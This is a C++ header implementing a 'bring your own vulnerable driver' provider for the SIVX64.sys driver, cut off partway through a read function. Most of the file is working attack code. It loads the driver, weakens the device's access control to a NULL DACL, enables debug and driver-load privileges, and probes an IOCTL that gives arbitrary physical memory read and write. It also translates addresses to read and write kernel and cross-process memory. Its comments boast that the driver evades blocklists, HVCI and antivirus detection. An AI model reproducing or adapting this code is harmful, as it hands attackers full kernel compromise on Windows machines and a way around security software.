#pragma once
// ============================================================
// sivdriver.h — SIVX64.sys (System Information Viewer) BYOVD Provider
// WHQL signed by Microsoft Windows Hardware Compatibility Publisher.
// Loads despite HVCI. Not on any blocklist. No CVE. 0/73 VT.
//
// MmMapIoSpace resolved dynamically via MmGetSystemRoutineAddress
// (not in IAT — invisible to static import scanning).
//
// Device path: \\.\SIVDRIVER
// Service name: sc.exe create SIVDRIVER type=kernel
//
// Cmd 0x14 — arbitrary physical memory mapped R/W (critical)
//   Input (0x10 bytes):
//     +0x00  UINT64 PhysicalAddress
//     +0x08  UINT32 Size
//     +0x0C  UINT16 unused (padding)
//     +0x0E  UINT16 Flags  (0x2=write, 0x4=read/readback)
//   For READ:  output buffer receives Size bytes
//   For WRITE: write data follows header at +0x10
//
// ReadBuffer/WriteBuffer translate kernel VA → PA via page table
// walk before issuing IOCTLs (same approach as CorMem/WDT).
// ============================================================

#include <Windows.h>
#include <Psapi.h>
#include <AccCtrl.h>
#include <AclAPI.h>
#include <cstdint>
#include <cstdio>
#include <cstring>
#include <vector>
#include "driver_provider.h"

namespace BYOVD
{
    // SIVX64 uses raw integer IOCTL codes (not CTL_CODE format)
    // These are METHOD_BUFFERED (low 2 bits = 0)
    constexpr DWORD SIV_CMD_READ_PHYS      = 0x10;  // Scatter-gather phys read
    constexpr DWORD SIV_CMD_READ_PHYS_BULK  = 0x13;  // MDL-based bulk phys read
    constexpr DWORD SIV_CMD_MAP_RW          = 0x14;  // MmMapIoSpace mapped R/W (S-G mode)

    // IOCTL flag bits
    constexpr UINT8 SIV_FLAG_WRITE    = 0x2;
    constexpr UINT8 SIV_FLAG_READBACK = 0x4;

    // Page table entry constants
    namespace SIVPage
    {
        constexpr uint64_t PRESENT  = 1ULL;
        constexpr uint64_t LARGE    = (1ULL << 7);
        constexpr uint64_t PFN_MASK = 0x000FFFFFFFFFF000ULL;
        constexpr uint64_t SIZE_4KB = 0x1000;
        constexpr uint64_t SIZE_2MB = 0x200000;
        constexpr uint64_t SIZE_1GB = 0x40000000;
    }

    // Processor Startup Block signature constants
    namespace SIVPSB
    {
        constexpr uint64_t SIG_MASK   = 0x00000000FFFFFFFFULL;
        constexpr uint64_t SIG_VALUE  = 0x00000000000006B0ULL;
        constexpr uint64_t KVA_MASK   = 0xFFFF000000000000ULL;
        constexpr uint64_t KVA_EXPECT = 0xFFFFF00000000000ULL;
        constexpr uint64_t PML4_BAD   = 0xFFF;  // Low 12 bits should be 0 for a valid CR3
    }

    #pragma pack(push, 1)

    // Simple flat IOCTL header used by TestIOCTL / ReadPhysical / WritePhysical
    // This is the 16-byte structure the driver actually reads for basic R/W
    struct SIV_MAP_RW_INPUT
    {
        UINT64 PhysicalAddress;   // +0x00
        UINT32 Size;              // +0x08
        UINT16 Padding;           // +0x0C
        UINT8  Flags;             // +0x0E (SIV_FLAG_WRITE=0x2, SIV_FLAG_READBACK=0x4)
        UINT8  Reserved;          // +0x0F
    };
    static_assert(sizeof(SIV_MAP_RW_INPUT) == 0x10, "SIV flat header must be 16 bytes");

    // Cmd 0x14 Scatter Entry structure (24 bytes) — for scatter-gather mode
    // Verified layout via probe: data appears at entry+12 (byte 60 of full struct)
    struct SIV_SCATTER_ENTRY
    {
        UINT32 Offset;        // +0x00 Byte offset within mapped region
        UINT32 DwordCount;    // +0x04 Number of DWORDs to read (1-3)
        UINT32 _pad;          // +0x08 Reserved (driver fills, always 0)
        UINT8  Data[12];      // +0x0C Read/write data (max 3 DWORDs = 12 bytes)
    };

    // Cmd 0x14 full scatter-gather input structure (0x30 header + entries)
    struct SIV_MAP_RW_HEADER
    {
        UINT64 PhysicalAddress;       // +0x00
        UINT32 MapSize;               // +0x08 (0x100 to 0x400000)
        UINT16 Unknown1;              // +0x0C
        UINT8  Flags;                 // +0x0E (bit 0 = cache type)
        UINT8  Unknown2;              // +0x0F
        UINT32 Unknown3;              // +0x10
        UINT16 EntryCount;            // +0x14 (scatter entries)
        UINT8  Reserved[0x1A];        // +0x16 to +0x30
    };

    struct SIV_MAP_RW_SCATTER
    {
        SIV_MAP_RW_HEADER Header;
        SIV_SCATTER_ENTRY Entry;
    };
    static_assert(sizeof(SIV_MAP_RW_SCATTER) == 0x48, "SIV scatter must be 72 bytes");

    #pragma pack(pop)

    class SIVDriverProvider : public IDriverProvider
    {
        HANDLE   m_hDevice   = INVALID_HANDLE_VALUE;
        HANDLE   m_hEvent    = nullptr;  // SIV_Driver_Event gate
        uint64_t m_systemDTB = 0;
        int      m_protoMode = 1;       // Detected IOCTL protocol
        uint64_t m_ioctlCount = 0;      // Total IOCTLs issued (diagnostic)

        // Safe physical memory ranges (actual RAM, NOT MMIO)
        struct PhysRange { uint64_t start, end; };
        std::vector<PhysRange> m_ramRanges;

        static constexpr const wchar_t* SVC_NAME  = L"SIVDRVcs2";
        static constexpr const wchar_t* DEV_PATH  = L"\\\\.\\SIVDRIVER";
        static constexpr const char*    DISP_NAME = "SIVX64";

    public:
        const wchar_t* ServiceName() const override { return SVC_NAME; }
        const char*    DisplayName() const override  { return DISP_NAME; }

        bool Open() override
        {
            if (!LoadDriver())
                printf("[BYOVD] Driver load skipped or failed, trying existing device...\n");

            // The SIV driver checks for a named event before allowing device access.
            // Create it first so the IRP_MJ_CREATE handler doesn't reject us.
            m_hEvent = CreateEventW(nullptr, TRUE, FALSE, L"Global\\SIV_Driver_Event");
            if (!m_hEvent)
                m_hEvent = OpenEventW(EVENT_ALL_ACCESS, FALSE, L"Global\\SIV_Driver_Event");
            if (m_hEvent)
                printf("[BYOVD] SIV_Driver_Event created/opened\n");
            else
                printf("[BYOVD] SIV_Driver_Event failed: 0x%lX\n", GetLastError());

            // Also try the non-global namespace
            HANDLE hEvLocal = CreateEventW(nullptr, TRUE, FALSE, L"SIV_Driver_Event");
            if (hEvLocal)
                printf("[BYOVD] Local SIV_Driver_Event created\n");

            // Try opening with standard access
            m_hDevice = CreateFileW(DEV_PATH,
                GENERIC_READ | GENERIC_WRITE,
                0, nullptr, OPEN_EXISTING, 0, nullptr);

            if (m_hDevice == INVALID_HANDLE_VALUE)
            {
                DWORD err = GetLastError();
                printf("[BYOVD]   GENERIC_READ|WRITE → 0x%lX\n", err);

                // If ACCESS_DENIED, try modifying the device DACL first
                if (err == ERROR_ACCESS_DENIED)
                {
                    printf("[BYOVD] Attempting DACL modification on device...\n");
                    GrantDeviceAccess();

                    // Retry after DACL change
                    m_hDevice = CreateFileW(DEV_PATH,
                        GENERIC_READ | GENERIC_WRITE,
                        0, nullptr, OPEN_EXISTING, 0, nullptr);

                    if (m_hDevice != INVALID_HANDLE_VALUE)
                    {
                        printf("[BYOVD] SIVDRIVER opened after DACL fix\n");
                    }
                    else
                    {
                        // Final fallback: try lower access levels
                        struct { DWORD access; const char* desc; } alts[] = {
                            { MAXIMUM_ALLOWED,                    "MAXIMUM_ALLOWED" },
                            { FILE_READ_DATA | FILE_WRITE_DATA,   "READ_DATA|WRITE_DATA" },
                            { 0,                                   "zero-access" },
                        };
                        for (auto& a : alts)
                        {
                            m_hDevice = CreateFileW(DEV_PATH, a.access, 0,
                                nullptr, OPEN_EXISTING, 0, nullptr);
                            if (m_hDevice != INVALID_HANDLE_VALUE)
                            {
                                printf("[BYOVD] Opened with %s\n", a.desc);
                                break;
                            }
                            printf("[BYOVD]   %s → 0x%lX\n", a.desc, GetLastError());
                        }
                    }
                }
            }
            else
            {
                printf("[BYOVD] SIVDRIVER opened OK\n");
            }

            // Clean up local event handle (global stays alive through m_hEvent)
            if (hEvLocal) CloseHandle(hEvLocal);

            if (m_hDevice == INVALID_HANDLE_VALUE)
            {
                printf("[BYOVD] Failed to open SIVDRIVER device\n");
                if (m_hEvent) { CloseHandle(m_hEvent); m_hEvent = nullptr; }
                return false;
            }

            // Test IOCTL: try reading 8 bytes from physical address 0
            // Initialize safe physical memory ranges BEFORE any reads
            InitSafePhysicalRanges();

            if (!TestIOCTL())
            {
                printf("[BYOVD] IOCTL test failed — cannot read physical memory\n");
                Close();
                return false;
            }

            // ReadPhysical self-test: verify multi-byte reads assemble correctly
            {
                uint32_t a = 0, b = 0;
                ReadPhysical(0x1000, &a, 4);
                ReadPhysical(0x1004, &b, 4);
                uint8_t combo[8] = {};
                ReadPhysical(0x1000, combo, 8);
                uint32_t ca = 0, cb = 0;
                memcpy(&ca, combo, 4);
                memcpy(&cb, combo + 4, 4);
                printf("[BYOVD] ReadPhysical self-test: single={0x%08X,0x%08X} combo={0x%08X,0x%08X} %s\n",
                    a, b, ca, cb, (a == ca && b == cb) ? "OK" : "MISMATCH!");
                fflush(stdout);
            }

            // Discover system DTB for VA→PA translation
            if (!FindSystemDTB())
            {
                printf("[BYOVD] System DTB discovery failed\n");
                Close();
                return false;
            }

            printf("[BYOVD] SIVX64 opened — DTB=0x%llX\n",
                   (unsigned long long)m_systemDTB);
            return true;
        }

        void Close() override
        {
            if (m_hDevice != INVALID_HANDLE_VALUE)
            {
                CloseHandle(m_hDevice);
                m_hDevice = INVALID_HANDLE_VALUE;
            }
            if (m_hEvent)
            {
                CloseHandle(m_hEvent);
                m_hEvent = nullptr;
            }
            m_systemDTB = 0;
        }

        bool IsOpen() const override { return m_hDevice != INVALID_HANDLE_VALUE; }

        // Read buffer at kernel VIRTUAL address (VA→PA translation + physical read)
        bool ReadBuffer(uintptr_t address, void* buffer, size_t size) override
        {
            if (!size) return true;
            if (!m_systemDTB) return false;

            auto* dst = static_cast<uint8_t*>(buffer);
            size_t remaining = size;
            uint64_t va = address;

            while (remaining > 0)
            {
                uint64_t pa = TranslateVA(m_systemDTB, va);
                if (!pa) return false;

                // Don't cross page boundaries
                size_t chunk = min(remaining,
                    (size_t)(SIVPage::SIZE_4KB - (va & 0xFFF)));
                if (!ReadPhysical(pa, dst, chunk)) return false;

                dst += chunk;
                va += chunk;
                remaining -= chunk;
            }
            return true;
        }

        // Write buffer at kernel VIRTUAL address (VA→PA translation + physical write)
        bool WriteBuffer(uintptr_t address, const void* buffer, size_t size) override
        {
            if (!size) return true;
            if (!m_systemDTB) return false;

            auto* src = static_cast<const uint8_t*>(buffer);
            size_t remaining = size;
            uint64_t va = address;

            while (remaining > 0)
            {
                uint64_t pa = TranslateVA(m_systemDTB, va);
                if (!pa) return false;

                size_t chunk = min(remaining,
                    (size_t)(SIVPage::SIZE_4KB - (va & 0xFFF)));
                if (!WritePhysical(pa, src, chunk)) return false;

                src += chunk;
                va += chunk;
                remaining -= chunk;
            }
            return true;
        }

        ~SIVDriverProvider() override { Close(); }

        // Cross-process R/W using target process CR3
        bool ReadBufferProcess(uint64_t processCR3, uintptr_t va, void* buffer, size_t size) override
        {
            if (!size) return true;
            if (!processCR3) return false;

            auto* dst = static_cast<uint8_t*>(buffer);
            size_t remaining = size;
            uint64_t addr = va;

            while (remaining > 0)
            {
                uint64_t pa = TranslateVA(processCR3, addr);
                if (!pa) return false;

                size_t chunk = min(remaining,
                    (size_t)(SIVPage::SIZE_4KB - (addr & 0xFFF)));
                if (!ReadPhysical(pa, dst, chunk)) return false;

                dst += chunk;
                addr += chunk;
                remaining -= chunk;
            }
            return true;
        }

        bool WriteBufferProcess(uint64_t processCR3, uintptr_t va, const void* buffer, size_t size) override
        {
            if (!size) return true;
            if (!processCR3) return false;

            auto* src = static_cast<const uint8_t*>(buffer);
            size_t remaining = size;
            uint64_t addr = va;

            while (remaining > 0)
            {
                uint64_t pa = TranslateVA(processCR3, addr);
                if (!pa) return false;

                size_t chunk = min(remaining,
                    (size_t)(SIVPage::SIZE_4KB - (addr & 0xFFF)));
                if (!WritePhysical(pa, src, chunk)) return false;

                src += chunk;
                addr += chunk;
                remaining -= chunk;
            }
            return true;
        }

    private:

        // ---- Physical memory safety ----
        // Reads from MMIO regions (PCI BARs, GPU VRAM) via MmMapIoSpace can BSOD.
        // Query Windows for actual RAM ranges and only allow reads within them.

        void InitSafePhysicalRanges()
        {
            m_ramRanges.clear();

            // Try registry: HKLM\HARDWARE\RESOURCEMAP\System Resources\Physical Memory\.Translated
            HKEY hKey = nullptr;
            if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
                L"HARDWARE\\RESOURCEMAP\\System Resources\\Physical Memory",
                0, KEY_READ, &hKey) == ERROR_SUCCESS)
            {
                DWORD dataSize = 0;
                if (RegQueryValueExW(hKey, L".Translated", nullptr, nullptr, nullptr, &dataSize) == ERROR_SUCCESS
                    && dataSize > 16)
                {
                    std::vector<uint8_t> data(dataSize);
                    DWORD type = 0;
                    if (RegQueryValueExW(hKey, L".Translated", nullptr, &type, data.data(), &dataSize) == ERROR_SUCCESS)
                    {
                        // CM_RESOURCE_LIST layout (packed):
                        //   ULONG Count
                        //   CM_FULL_RESOURCE_DESCRIPTOR[Count]:
                        //     ULONG InterfaceType, ULONG BusNumber
                        //     CM_PARTIAL_RESOURCE_LIST:
                        //       USHORT Version, USHORT Revision, ULONG Count
                        //       CM_PARTIAL_RESOURCE_DESCRIPTOR[Count]:  (each 20 bytes on x64)
                        //         UCHAR Type, UCHAR ShareDisp, USHORT Flags
                        //         union { struct { LARGE_INTEGER Start; ULONG Length; } Memory; }
                        const uint8_t* p = data.data();
                        const uint8_t* end = p + dataSize;

                        if (p + 4 <= end)
                        {
                            uint32_t listCount = *(const uint32_t*)p; p += 4;
                            for (uint32_t li = 0; li < listCount && p + 16 <= end; li++)
                            {
                                p += 8; // InterfaceType + BusNumber
                                if (p + 8 > end) break;
                                p += 4; // Version + Revision
                                uint32_t descCount = *(const uint32_t*)p; p += 4;

                                for (uint32_t di = 0; di < descCount && p + 20 <= end; di++)
                                {
                                    uint8_t resType = p[0];
                                    uint16_t flags = *(const uint16_t*)(p + 2);
                                    uint64_t start = *(const uint64_t*)(p + 4);
                                    uint32_t length = *(const uint32_t*)(p + 12);

                                    // CmResourceTypeMemory = 3
                                    if (resType == 3 && length > 0)
                                    {
                                        uint64_t rangeEnd = start + length;
                                        m_ramRanges.push_back({start, rangeEnd});
                                    }
                                    // CmResourceTypeMemoryLarge = 7 (flags determine scale)
                                    else if (resType == 7 && length > 0)
                                    {
                                        uint64_t scaledLen = length;
                                        if (flags & 0x0200) scaledLen <<= 8;   // 40-bit
                                        else if (flags & 0x0400) scaledLen <<= 16; // 48-bit
                                        else if (flags & 0x0800) scaledLen <<= 32; // 64-bit
                                        m_ramRanges.push_back({start, start + scaledLen});
                                    }
                                    p += 20; // sizeof(CM_PARTIAL_RESOURCE_DESCRIPTOR) packed
                                }
                            }
                        }
                    }
                }
                RegCloseKey(hKey);
            }

            if (!m_ramRanges.empty())
            {
                // Sort by start address for efficient lookup
                for (size_t i = 0; i < m_ramRanges.size(); i++)
                    for (size_t j = i + 1; j < m_ramRanges.size(); j++)
                        if (m_ramRanges[j].start < m_ramRanges[i].start)
                            std::swap(m_ramRanges[i], m_ramRanges[j]);

                printf("[BYOVD] Physical RAM ranges from registry (%zu):\n", m_ramRanges.size());
                for (auto& r : m_ramRanges)
                    printf("[BYOVD]   0x%llX - 0x%llX (%llu MB)\n",
                        r.start, r.end, (r.end - r.start) >> 20);
                return;
            }

            // Fallback: estimate from GlobalMemoryStatusEx + avoid PCI hole
            printf("[BYOVD] Registry RAM ranges unavailable, using conservative estimates\n");
            MEMORYSTATUSEX ms = { sizeof(ms) };
            GlobalMemoryStatusEx(&ms);
            uint64_t totalRAM = ms.ullTotalPhys;
            printf("[BYOVD] Total physical memory: %llu MB\n", totalRAM >> 20);

            // Safe low region: 0 to min(2.5GB, totalRAM) — before PCI hole
            uint64_t lowEnd = min((uint64_t)0xA0000000ULL, totalRAM);
            m_ramRanges.push_back({0, lowEnd});

            // Above 4GB if system has >3GB RAM
            if (totalRAM > 0xC0000000ULL)
            {
                uint64_t aboveRAM = totalRAM - 0xC0000000ULL; // approximate amount above 4GB
                m_ramRanges.push_back({0x100000000ULL, 0x100000000ULL + aboveRAM + 0x10000000ULL});
            }

            printf("[BYOVD] Conservative RAM ranges (%zu):\n", m_ramRanges.size());
            for (auto& r : m_ramRanges)
                printf("[BYOVD]   0x%llX - 0x%llX (%llu MB)\n",
                    r.start, r.end, (r.end - r.start) >> 20);
        }

        // Check if a physical address is within known RAM (safe to read)
        bool IsPhysicalAddressSafe(uint64_t pa, size_t size = 4) const
        {
            if (m_ramRanges.empty()) return true; // No info — allow (shouldn't happen)

            // Hardcoded exclusions — always reject regardless of registry data
            uint64_t paEnd = pa + size;
            // PCI MMIO hole: 0xC0000000 - 0xFFFFFFFF (3GB-4GB)
            if (pa < 0x100000000ULL && paEnd > 0xC0000000ULL) return false;
            // Legacy VGA/BIOS: 0xA0000 - 0xFFFFF
            if (pa < 0x100000ULL && paEnd > 0xA0000ULL) return false;
            // APIC/HPET: 0xFEC00000 - 0xFEFFFFFF
            if (pa >= 0xFEC00000ULL && pa < 0xFF000000ULL) return false;

            for (auto& r : m_ramRanges)
                if (pa >= r.start && paEnd <= r.end)
                    return true;
            return false;
        }

        // Get next safe physical address >= pa (for efficient range scanning)
        uint64_t NextSafeAddress(uint64_t pa) const
        {
            for (auto& r : m_ramRanges)
            {
                if (pa < r.start) return r.start;
                if (pa < r.end) return pa; // Already in range
            }
            return UINT64_MAX; // No more safe ranges
        }

        // ---- Device DACL modification ----
        // If the driver sets a restrictive DACL (e.g. SYSTEM-only),
        // modify it to grant Administrators full access.
        void GrantDeviceAccess()
        {
            // Use NtOpenFile to access the device's NT namespace object
            // and modify its security descriptor. We need WRITE_DAC access,
            // which admin should be able to get on kernel objects.

            // Method 1: SetNamedSecurityInfo on the DOS device path
            DWORD result = SetNamedSecurityInfoW(
                const_cast<wchar_t*>(L"\\\\.\\SIVDRIVER"),
                SE_FILE_OBJECT,
                DACL_SECURITY_INFORMATION,
                nullptr, nullptr,
                nullptr, // NULL DACL = grant everyone full access
                nullptr);
            printf("[BYOVD]   SetNamedSecurityInfo → %lu\n", result);

            // Method 2: Open with WRITE_DAC and set a permissive DACL
            HANDLE hDev = CreateFileW(DEV_PATH, WRITE_DAC,
                0, nullptr, OPEN_EXISTING, 0, nullptr);
            if (hDev != INVALID_HANDLE_VALUE)
            {
                printf("[BYOVD]   Opened with WRITE_DAC, setting null DACL\n");
                SECURITY_DESCRIPTOR sd;
                InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION);
                SetSecurityDescriptorDacl(&sd, TRUE, nullptr, FALSE);
                if (SetKernelObjectSecurity(hDev, DACL_SECURITY_INFORMATION, &sd))
                    printf("[BYOVD]   DACL modified successfully\n");
                else
                    printf("[BYOVD]   SetKernelObjectSecurity failed: 0x%lX\n", GetLastError());
                CloseHandle(hDev);
            }
            else
            {
                printf("[BYOVD]   WRITE_DAC open failed: 0x%lX\n", GetLastError());
            }

            // Method 3: Enable SeDebugPrivilege (may help with some drivers)
            HANDLE hToken;
            if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
            {
                TOKEN_PRIVILEGES tp{};
                LookupPrivilegeValueW(nullptr, L"SeDebugPrivilege", &tp.Privileges[0].Luid);
                tp.PrivilegeCount = 1;
                tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
                AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), nullptr, nullptr);
                printf("[BYOVD]   SeDebugPrivilege: 0x%lX\n", GetLastError());

                // Also enable SeLoadDriverPrivilege
                LookupPrivilegeValueW(nullptr, L"SeLoadDriverPrivilege", &tp.Privileges[0].Luid);
                AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), nullptr, nullptr);
                printf("[BYOVD]   SeLoadDriverPrivilege: 0x%lX\n", GetLastError());

                CloseHandle(hToken);
            }
        }

        // ---- IOCTL diagnostic test ----
        // Try all command variations to find working protocol
        bool TestIOCTL()
        {
            printf("[BYOVD] Testing IOCTL protocol...\n");

            // Test Strategy 0: Cmd 0x14 scatter-gather (MmMapIoSpace, full physical range)
            // Uses 72-byte struct. Flags=0 for reads (Flags=4 SUPPRESSES data).
            // Data appears at Entry.Data (entry offset +0x0C, byte 60 of full struct).
            {
                SIV_MAP_RW_SCATTER scatter{};
                scatter.Header.PhysicalAddress = 0x1000;
                scatter.Header.MapSize         = 0x1000;
                scatter.Header.Flags           = 0;        // 0 = read (NOT 0x4!)
                scatter.Header.EntryCount      = 1;
                scatter.Entry.Offset           = 0;
                scatter.Entry.DwordCount       = 1;        // 1 DWORD = 4 bytes

                DWORD ret = 0;
                BOOL ok = DeviceIoControl(m_hDevice, SIV_CMD_MAP_RW,
                    &scatter, sizeof(scatter),
                    &scatter, sizeof(scatter),
                    &ret, nullptr);

                uint32_t val = 0;
                memcpy(&val, scatter.Entry.Data, 4);
                printf("[BYOVD]   Strategy0 (scatter Flags=0): ok=%d ret=%lu dword=0x%08X\n",
                    ok, ret, val);

                if (ok && ret >= 72)
                {
                    // The driver accepted our 72-byte buffer. Now verify data by
                    // reading PA 0x2000000 (32MB — tests full MmMapIoSpace range)
                    SIV_MAP_RW_SCATTER test2{};
                    test2.Header.PhysicalAddress = 0x2000000;
                    test2.Header.MapSize         = 0x1000;
                    test2.Header.Flags           = 0;
                    test2.Header.EntryCount      = 1;
                    test2.Entry.Offset           = 0;
                    test2.Entry.DwordCount       = 2; // 8 bytes
                    DWORD ret2 = 0;
                    DeviceIoControl(m_hDevice, SIV_CMD_MAP_RW,
                        &test2, sizeof(test2), &test2, sizeof(test2), &ret2, nullptr);

                    uint32_t d0 = 0, d1 = 0;
                    memcpy(&d0, test2.Entry.Data, 4);
                    memcpy(&d1, test2.Entry.Data + 4, 4);
                    printf("[BYOVD]   → PA=0x2000000 verify: ret=%lu d0=0x%08X d1=0x%08X\n",
                        ret2, d0, d1);

                    m_protoMode = 7;
                    printf("[BYOVD]   → Strategy 0 works! (scatter-gather, MmMapIoSpace)\n");

                    // ---- Verify scatter capabilities ----
                    // DwordCount>1 has been observed to NOT return data beyond the first DWORD.
                    // Test: read DWORD at Offset=0, then at Offset=4, then try DwordCount=2.
                    auto readOneDword = [&](uint64_t pa, uint32_t off) -> uint32_t {
                        SIV_MAP_RW_SCATTER s{};
                        s.Header.PhysicalAddress = pa & ~0xFFFULL;
                        s.Header.MapSize = 0x1000;
                        s.Header.Flags = 0;
                        s.Header.EntryCount = 1;
                        s.Entry.Offset = off;
                        s.Entry.DwordCount = 1;
                        DWORD r = 0;
                        DeviceIoControl(m_hDevice, SIV_CMD_MAP_RW, &s, sizeof(s), &s, sizeof(s), &r, nullptr);
                        uint32_t v = 0;
                        memcpy(&v, s.Entry.Data, 4);
                        return v;
                    };
                    // Use PA with known non-zero data
                    uint32_t s0 = readOneDword(0x2000000, 0);
                    uint32_t s4 = readOneDword(0x2000000, 4);
                    // Try DwordCount=2 at same PA
                    SIV_MAP_RW_SCATTER sMulti{};
                    sMulti.Header.PhysicalAddress = 0x2000000;
                    sMulti.Header.MapSize = 0x1000;
                    sMulti.Header.Flags = 0;
                    sMulti.Header.EntryCount = 1;
                    sMulti.Entry.Offset = 0;
                    sMulti.Entry.DwordCount = 2;
                    DWORD rM = 0;
                    DeviceIoControl(m_hDevice, SIV_CMD_MAP_RW, &sMulti, sizeof(sMulti), &sMulti, sizeof(sMulti), &rM, nullptr);
                    uint32_t m0 = 0, m1 = 0;
                    memcpy(&m0, sMulti.Entry.Data, 4);
                    memcpy(&m1, sMulti.Entry.Data + 4, 4);
                    printf("[BYOVD]   Scatter test: [0]=0x%08X [4]=0x%08X  multi[0]=0x%08X multi[1]=0x%08X\n",
                        s0, s4, m0, m1);
                    if (m1 == s4 && s4 != 0)
                        printf("[BYOVD]   → DwordCount=2 works\n");
                    else
                        printf("[BYOVD]   → DwordCount=2 broken — using 4 bytes/entry\n");

                    return true;
                }
            }

            // Test Strategy 1: Cmd 0x14, input=header(16), output=buffer(8)
            {
                SIV_MAP_RW_INPUT hdr{};
                hdr.PhysicalAddress = 0x1000;  // Page 1 (usually valid)
                hdr.Size = 8;
                hdr.Padding = 0;
                hdr.Flags = SIV_FLAG_READBACK; // 0x4
                uint8_t out[8] = {};
                DWORD ret = 0;
                BOOL ok = DeviceIoControl(m_hDevice, SIV_CMD_MAP_RW,
                    &hdr, sizeof(hdr), out, 8, &ret, nullptr);
                printf("[BYOVD]   Strategy1 (cmd=0x14 hdr→out): ok=%d ret=%lu err=0x%lX data=%02X%02X%02X%02X\n",
                    ok, ret, GetLastError(), out[0], out[1], out[2], out[3]);
                if (ok && ret > 0 && (out[0] || out[1] || out[2] || out[3]))
                {
                    m_protoMode = 1;
                    printf("[BYOVD]   → Strategy 1 works!\n");
                    return true;
                }
            }

            // Test Strategy 2: Cmd 0x14, combined buffer (header+data in one)
            {
                uint8_t buf[0x18] = {};
                auto* hdr = reinterpret_cast<SIV_MAP_RW_INPUT*>(buf);
                hdr->PhysicalAddress = 0x1000;
                hdr->Size = 8;
                hdr->Padding = 0;
                hdr->Flags = SIV_FLAG_READBACK;
                DWORD ret = 0;
                BOOL ok = DeviceIoControl(m_hDevice, SIV_CMD_MAP_RW,
                    buf, sizeof(buf), buf, sizeof(buf), &ret, nullptr);
                printf("[BYOVD]   Strategy2 (cmd=0x14 combined): ok=%d ret=%lu err=0x%lX\n", ok, ret, GetLastError());
                if (ok && ret > 0)
                {
                    printf("[BYOVD]     hdr area: ");
                    for (int i = 0; i < 16; i++) printf("%02X ", buf[i]);
                    printf("\n[BYOVD]     data area: ");
                    for (int i = 16; i < 24; i++) printf("%02X ", buf[i]);
                    printf("\n");

                    // Check if data is at offset 0 or 0x10
                    if (buf[0] || buf[1] || buf[2] || buf[3])
                    {
                        m_protoMode = 2; // data at offset 0
                        printf("[BYOVD]   → Strategy 2 works (data at offset 0)!\n");
                        return true;
                    }
                    if (buf[16] || buf[17] || buf[18] || buf[19])
                    {
                        m_protoMode = 3; // data at offset 0x10
                        printf("[BYOVD]   → Strategy 2 works (data at offset 0x10)!\n");
                        return true;
                    }
                }
            }

            // Test Strategy 3: Cmd 0x10 (scatter-gather read)
            {
                SIV_MAP_RW_INPUT hdr{};
                hdr.PhysicalAddress = 0x1000;
                hdr.Size = 8;
                hdr.Padding = 0;
                hdr.Flags = SIV_FLAG_READBACK;
                uint8_t out[8] = {};
                DWORD ret = 0;
                BOOL ok = DeviceIoControl(m_hDevice, SIV_CMD_READ_PHYS,
                    &hdr, sizeof(hdr), out, 8, &ret, nullptr);
                printf("[BYOVD]   Strategy3 (cmd=0x10 scatter): ok=%d ret=%lu err=0x%lX data=%02X%02X%02X%02X\n",
                    ok, ret, GetLastError(), out[0], out[1], out[2], out[3]);
                if (ok && ret > 0 && (out[0] || out[1] || out[2] || out[3]))
                {
                    m_protoMode = 4;
                    printf("[BYOVD]   → Strategy 3 works!\n");
                    return true;
                }
            }

            // Test Strategy 4: Cmd 0x14 with flags=0x6 (write | readback)
            {
                SIV_MAP_RW_INPUT hdr{};
                hdr.PhysicalAddress = 0x1000;
                hdr.Size = 8;
                hdr.Padding = 0;
                hdr.Flags = SIV_FLAG_WRITE | SIV_FLAG_READBACK; // 0x6
                uint8_t out[8] = {};
                DWORD ret = 0;
                BOOL ok = DeviceIoControl(m_hDevice, SIV_CMD_MAP_RW,
                    &hdr, sizeof(hdr), out, 8, &ret, nullptr);
                printf("[BYOVD]   Strategy4 (cmd=0x14 flags=0x6): ok=%d ret=%lu err=0x%lX data=%02X%02X%02X%02X\n",
                    ok, ret, GetLastError(), out[0], out[1], out[2], out[3]);
                if (ok && ret > 0 && (out[0] || out[1] || out[2] || out[3]))
                {
                    m_protoMode = 5;
                    printf("[BYOVD]   → Strategy 4 works!\n");
                    return true;
                }
            }

            // Test Strategy 5: Try standard CTL_CODE format IOCTL
            // CTL_CODE(FILE_DEVICE_UNKNOWN, 0x14, METHOD_BUFFERED, FILE_ANY_ACCESS)
            {
                constexpr DWORD ctlCode = (0x22 << 16) | (0 << 14) | (0x14 << 2) | 0;
                SIV_MAP_RW_INPUT hdr{};
                hdr.PhysicalAddress = 0x1000;
                hdr.Size = 8;
                hdr.Padding = 0;
                hdr.Flags = SIV_FLAG_READBACK;
                uint8_t out[8] = {};
                DWORD ret = 0;
                BOOL ok = DeviceIoControl(m_hDevice, ctlCode,
                    &hdr, sizeof(hdr), out, 8, &ret, nullptr);
                printf("[BYOVD]   Strategy5 (CTL_CODE 0x%X): ok=%d ret=%lu err=0x%lX data=%02X%02X%02X%02X\n",
                    ctlCode, ok, ret, GetLastError(), out[0], out[1], out[2], out[3]);
                if (ok && ret > 0 && (out[0] || out[1] || out[2] || out[3]))
                {
                    m_protoMode = 6;
                    printf("[BYOVD]   → Strategy 5 works!\n");
                    return true;
                }
            }

            printf("[BYOVD] No IOCTL strategy succeeded\n");
            return false;
        }

        // ---- Cmd 0x14 fallback with various buffer layouts ----
        bool ReadPhysicalCmd14(uint64_t physAddr, void* buffer, size_t size)
        {
            DWORD ret = 0;
            BOOL ok;

            // Variant A: input=header+size padding, output=size
            {
                std::vector<uint8_t> inBuf(sizeof(SIV_MAP_RW_INPUT) + size, 0);
                auto* h = reinterpret_cast<SIV_MAP_RW_INPUT*>(inBuf.data());
                h->PhysicalAddress = physAddr;
                h->Size = static_cast<UINT32>(size);
                h->Flags = SIV_FLAG_READBACK;
                ok = DeviceIoControl(m_hDevice, SIV_CMD_MAP_RW,
                    inBuf.data(), static_cast<DWORD>(inBuf.size()),
                    buffer, static_cast<DWORD>(size), &ret, nullptr);
                printf("[BYOVD]       Cmd14-A (in=%zu out=%zu): ok=%d ret=%lu err=0x%lX\n",
                    inBuf.size(), size, ok, ret, GetLastError());
                if (ok && ret > 0) { return true; }
            }

            // Variant B: input=size, output=size (header within output-sized input)
            {
                std::vector<uint8_t> buf(size, 0);
